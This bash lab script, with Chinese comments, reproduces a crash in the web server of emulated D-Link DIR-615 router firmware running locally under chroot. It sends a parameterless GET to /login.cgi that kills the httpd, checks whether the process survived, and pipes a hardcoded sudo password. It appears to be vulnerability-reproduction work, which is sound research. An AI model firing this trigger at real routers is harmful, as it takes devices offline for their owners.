#!/bin/bash
# 阶段 2+3：一键三对照 + 手工单发
cd /tmp || exit 1
REPO="${FWMAP_VM_ROOT:-/home/ubuntu/fwmap-run}"
ROOT=/home/ubuntu/lab/d615/root
export LANG=C.UTF-8

echo "########## 一键脚本（三对照 + 3 次触发） ##########"
echo ubuntu | sudo -S bash "$REPO/tools/poc-dir615-login-cgi.sh" "$ROOT" 2>&1 | tail -25

echo
echo "########## 手工单发：带参数（应该活着） ##########"
echo ubuntu | sudo -S bash -c 'pkill -9 -f "sbin/httpd" 2>/dev/null; sleep 0.5; chroot '"$ROOT"' /sbin/httpd -h /www -p 80 >/tmp/httpd2.log 2>&1 &' 2>/dev/null
sleep 3
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi?graph_id=1 HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
d = b""
while True:
    c = s.recv(4096)
    if not c:
        break
    d += c
print(f"  收到 {len(d)} 字节；首行：{d.split(b'\r\n')[0].decode('latin-1') if d else '(空)'}")
PY
echo "  进程状态：$(pgrep -f 'sbin/httpd' >/dev/null && echo up || echo down)"

echo
echo "########## 手工单发：不带参数（应该死） ##########"
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
print("  收到：", s.recv(4096))
PY
sleep 1
echo "  进程状态：$(pgrep -f 'sbin/httpd' >/dev/null && echo up || echo down)"
echo
echo "########## 服务端日志（最后 3 行） ##########"
tail -3 /tmp/httpd2.log 2>/dev/null
echo ubuntu | sudo -S pkill -9 -f 'sbin/httpd' 2>/dev/null
